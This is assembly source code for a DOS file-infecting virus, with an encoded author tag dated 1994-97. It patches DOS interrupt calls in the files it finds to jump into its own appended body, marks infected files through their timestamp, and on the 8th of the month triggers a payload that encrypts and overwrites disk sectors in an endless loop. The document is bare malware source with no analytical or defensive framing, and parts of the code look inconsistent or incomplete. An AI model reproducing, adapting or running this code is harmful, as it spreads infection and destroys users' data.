.286
.model tiny
.code
org 100h
start:
call xor_loop
jmp hurry_up
nop

virus:
mov word ptr cs:_bp,bp
pop bp
sub bp,3
pusha
push ds es
call $+3
pop si
sub si,($-virus)-1

restore_orig_4_bytes:
mov ah,byte ptr cs:[offset orig-offset virus+si ]
mov al,0b4h
mov cs:[bp],ax
mov cs:[bp+2],21cdh
mov bp,si

get_dta:
mov ah,2fh
int 21h
mov word ptr cs:_dta,bx
mov word ptr cs:_dta,es

set_dta:
mov ax,cs
add ax,2000h
mov ds,ax
xor dx,dx
mov ah,1ah
int 21h

find_first:
mov bh,4eh
xchg ax,bx
mov cx,20h
mov dx,offset fmask-offset virus
add dx,si
push ds cs
pop ds
int 21h
pop ds
find:
jnc save
_er:
jmp er

find_next:
mov ax,cs
add ax,2000h
mov ds,ax

mov ah,4fh
int 21h
jmp find

save:
mov ax,ds:[16h]
mov cs:_time,ax
and al,01fh
cmp al,7
jz find_next
mov ax,ds:[18h]
mov cs:_date,ax

open_find_file:
mov ax,3d02h
mov dx,1eh
int 21h
jnc read_file
jmp find_next
read_file:
xchg ax,bx

change_segment:
mov ax,ds
add ax,10h
mov ds,ax

mov ah,3fh
xor dx,dx
mov cx,0f000h
int 21h
jnc search_code
jmp close

search_code:
push ds
pop es
mov cx,ax
mov si,ax
mov di,dx
uuu:
mov al,0b4h
new:
cld
repne scasb
jne close
cmp word ptr es:[di+1],21CDh
jne new
great:
mov ax,di
dec ax
mov cx,si
mov si,ax
mov dx,cx
sub dx,ax
sub dx,3

change_code:
mov byte ptr ds:[si],0e8h
mov al,byte ptr ds:[si+1]
mov byte ptr cs:[offset orig - offset virus + bp],al
mov word ptr ds:[si+1],dx
in al,42h
mov byte ptr ds:[si+3],al

pointer_to_begin:
push cx
mov ax,4200h
xor cx,cx
xor dx,dx
int 21h
pop cx
jc close

save_file:
mov ah,40h
xor dx,dx
int 21h
jc rest

pointer_to_end:
mov ax,4202h
xor cx,cx
xor dx,dx
int 21h
jc rest

save_virus:
mov ah,40h
mov cx,virlen
push cs
pop ds
mov dx,bp
int 21h
jc rest

change_time_to_7_second:
mov ax,cs:_time
and al,01fh
add al,11
mov cs:_time,ax

rest:
call xor_loop
mov cx,5701h
xchg ax,cx
mov dx,cs:_date
mov cx,cs:_time
int 21h

close:
mov ah,3eh
int 21h

jmp find_next

er:
mov ah,1ah
lds dx,cs:_dta
int 21h
pop es ds
popa
push bp
mov bp,word ptr cs:_bp
ret

fmask db '*.TXT',0
_bp equ 0feh
_dta equ 0f0h
_time equ 0f4h
_date equ 0f6h
orig db 9

Hurry_up:
	MOV	AH,2Ah		;Get system date function
	INT	21h		;Get it!
	CMP	DL,8		;Is it the 8th
	JNZ	NO_PAYLOAD	;Nope!  So no payload
	call	TRACKCrypt

NO_PAYLOAD:	jmp virus
include	jacof.asm
TrackCrypt:
           dec     si           
           call    AllocTrackNumber 
           push    dx              
      UpdateCrypt: call xor_loop                 
           mov     bh,7Ch
           mov     es:[bx+29h],si  
           mov     ax,301h
           mov     cx,1
           mov     dh,ch
           int     13h             
     TrackDone:                    
                pop     dx
               inc     si          
           jmp     UpdateCrypt     
  DoublePart proc near 
                   mov     si,0772h
                   mov     di,0dd8h
                   mov     cx,15Dh
                   cld
                   rep     movsb
                       retn
				DoublePart  ENDP
    AllocTrackNumber PROC
               push    ax
            mov     ax,si
             mov     ch,al           
               push    cx              
            mov     cl,4               
             shl     ah,cl                   
               pop     cx
            mov     al,3Fh               
           and     dh,al                   
            and     cl,al           
             not     al                     
              push    ax
            and     ah,al          
           or      dh,ah           
               pop     ax              
            shl     ah,1                            
            shl     ah,1    
           and     ah,al
           or      cl,ah           
              pop     ax
               retn

	 AllocTrackNumber  ENDP
		CryptBody       proc    near
                   push    cx
                mov     si,dx
              mov     ax,0000      

              mov     cx,0DD8h
		    ContXOR:
               xor     [si],ax
              add     ax,0000      
                      inc     si
                     loop    ContXOR
                        pop     cx
                        retn
		CryptBody       endp

		  GetTrackNo    proc    near
              push    cx dx
            shr     cl,1
           shr     cl,1
         and     dh,0C0h
           or      dh,cl
            mov     cl,4
          shr     dh,cl
            mov     dl,ch
            xchg    si,dx
              pop     dx cx
              retn
	  GetTrackNo    endp
	call xor_loop
	     SecCrypt   proc    near
               push    ax bx cx
            mov     al,00
         mov     bx,0000       
           CryptOne:           
          mov     cx,0100h
          ContSecCrypt:        
   xor     word ptr es:[bx],3CF6h
               inc     bx
              inc     bx
            loop    ContSecCrypt
           dec     al
            jnz     CryptOne   
               pop     cx bx ax
               retn
	    SecCrypt    endp


author  db '-' xor 0dbh, '=' xor 0dbh, 20h xor 0dbh
        db 'L' xor 0dbh, 'U' xor 0dbh, 'C' xor 0dbh, 'K' xor 0dbh, 'Y' xor 0dbh
	db 20h xor 0dbh, 'B' xor 0dbh, '.' xor 0dbh, 'R' xor 0dbh, '.' xor 0dbh
	db 'D' xor 0dbh
	db 20h xor 0dbh, '1' xor 0dbh, '9' xor 0dbh, '9' xor 0dbh, '4' xor 0dbh
        db '-' xor 0dbh, '9' xor 0dbh, '7' xor 0dbh, 20h xor 0dbh
	db '=' xor 0dbh, '-' xor 0dbh

virlen	equ	$-virus
end	start
	
